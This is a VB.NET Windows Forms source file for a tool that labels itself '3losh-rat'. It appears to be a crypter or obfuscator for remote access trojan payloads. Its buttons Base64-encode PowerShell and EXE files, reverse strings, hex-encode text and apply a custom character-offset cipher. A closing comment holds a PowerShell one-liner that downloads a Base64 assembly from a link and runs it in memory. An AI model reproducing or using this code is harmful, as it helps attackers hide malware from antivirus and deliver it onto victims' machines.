﻿Imports System.IO
Imports System.Text

Public Class Form1
    Public Algos As New Algorithms
    Private Sub ReconButton2_Click(sender As Object, e As EventArgs) Handles ReconButton2.Click
        Dim text As String = Convert.ToBase64String(Encoding.Unicode.GetBytes(Me.TextBox1.Text))
        Me.TextBox1.Text = Convert.ToBase64String(Encoding.Unicode.GetBytes(Me.TextBox1.Text))
        Dim saveFileDialog As SaveFileDialog = New SaveFileDialog()

        saveFileDialog.FileName = "powershell-Encoded.ps1"
        File.WriteAllText(saveFileDialog.FileName, Me.TextBox1.Text, Encoding.Unicode)
        MessageBox.Show("[3losh-rat]", saveFileDialog.FileName)
    End Sub

    Private Sub ReconButton1_Click(sender As Object, e As EventArgs) Handles ReconButton1.Click
        Close()
    End Sub

    Private Sub ReconButton3_Click(sender As Object, e As EventArgs) Handles ReconButton3.Click
        MessageBox.Show("[3losh-rat], powershell -enc ")
        Me.texbox2.Text = My.Resources.RUN
    End Sub

    Private Sub ReconForm1_Click(sender As Object, e As EventArgs) Handles ReconForm1.Click

    End Sub

    Private Sub ReconButton4_Click(sender As Object, e As EventArgs) Handles ReconButton4.Click
        Dim dialog As New OpenFileDialog
        Dim dialog2 As OpenFileDialog = dialog
        dialog2.Title = "Select EXE File"
        dialog2.Filter = "(*.exe)|*.exe"
        dialog2.ShowDialog()
        dialog2 = Nothing
        Me.TxtBox1.Text = dialog.FileName
    End Sub

    Private Sub ReconButton8_Click(sender As Object, e As EventArgs) Handles ReconButton8.Click
        texbox2p.Text = Algos.Bs64(IO.File.ReadAllBytes(TxtBox1.Text))
        Longi.Text = Len(texbox2p.Text)

    End Sub

    Private Sub ReconButton5_Click(sender As Object, e As EventArgs) Handles ReconButton5.Click
        texbox2p.SelectAll()
        texbox2p.Copy()
    End Sub

    Private Sub ReconButton6_Click(sender As Object, e As EventArgs) Handles ReconButton6.Click
        texbox2p.Text = Nothing
    End Sub

    Private Sub ReconButton7_Click(sender As Object, e As EventArgs) Handles ReconButton7.Click
        texbox2p.Text = StrReverse(texbox2p.Text)
    End Sub

    Private Sub ReconButton9_Click(sender As Object, e As EventArgs) Handles ReconButton9.Click
        If ReconCheck1.CheckedState = True Then
            TxtBox2.Text = Algos.StrToHex(TxtBox2.Text)
        ElseIf ReconCheck1.CheckedState = False Then
            TxtBox2.Text = My.Resources.HEX
        End If
    End Sub
    Public Function zara(ByVal input As String) As String
        Dim stringBuilder As System.Text.StringBuilder = New System.Text.StringBuilder()
        Dim i As Integer = 0
        Dim length As Integer = input.Length
        While i < length
            Dim [string] As Char = input(i)
            stringBuilder.Append((Strings.Asc([string]) + 312).ToString() + " ")
            i += 1
        End While
        Return stringBuilder.ToString().Substring(0, stringBuilder.Length - 1)
    End Function

    Private Sub ReconButton10_Click(sender As Object, e As EventArgs) Handles ReconButton10.Click
        If ReconCheck1.CheckedState = True Then
            TxtBox2.Text = zara(TxtBox2.Text)
        ElseIf ReconCheck1.CheckedState = False Then
            TxtBox2.Text = My.Resources.ZARADECRYPT
        End If
    End Sub

    Private Sub TabPage1_Click(sender As Object, e As EventArgs) Handles TabPage1.Click

    End Sub
End Class


'[AppDomain]::CurrentDomain.Load([Convert]::Frombase64String((New-Object Net.WebClient).Downloadstring('link'))).EntryPoint.invoke($null,$null)
